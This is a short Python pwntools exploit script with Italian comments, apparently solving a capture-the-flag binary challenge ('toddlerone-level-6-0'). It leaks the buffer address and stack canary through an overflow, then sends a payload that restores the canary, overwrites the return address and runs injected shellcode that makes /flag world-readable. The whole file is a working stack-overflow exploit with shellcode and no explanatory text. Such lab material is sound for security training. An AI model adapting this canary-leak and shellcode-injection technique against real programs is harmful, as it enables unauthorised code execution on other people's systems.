from pwn import *

context.arch = 'amd64'


elf = ELF('/challenge/toddlerone-level-6-0')
io = elf.process()

# Fase 1: Leak del canary
io.recvuntil(b"The input buffer begins at 0x")
buff_addr = int(io.recvuntil(b',')[:-1], 16)
print(hex(buff_addr))
# Primo payload: Leak del canary
payload = b"REPEAT" + b"A"*128 + b"XYZ"
io.sendline(f"{len(payload)}".encode())
io.sendline(payload)
io.recvuntil(b"XYZ")
canary = u64(io.recv(7).rjust(8, b'\x00'))
print(canary)

sc = asm(shellcraft.chmod('/flag', 0x777))
print(len(sc))
payload = b"A" * (112) + (b"\x00" * 4) + b"\x5a" + (b"\x00" * 3) + b"\x01" + (b"\x00" * 7) + (b"A" * 8)
payload += p64(canary)
payload += b"B" * 24
payload += p64(buff_addr-80) + sc

# Invio del terzo payload per scrivere e uscire
io.sendline(f"{len(payload)}".encode())
io.sendline(payload)

# Interattivo per vedere il risultato
io.interactive()
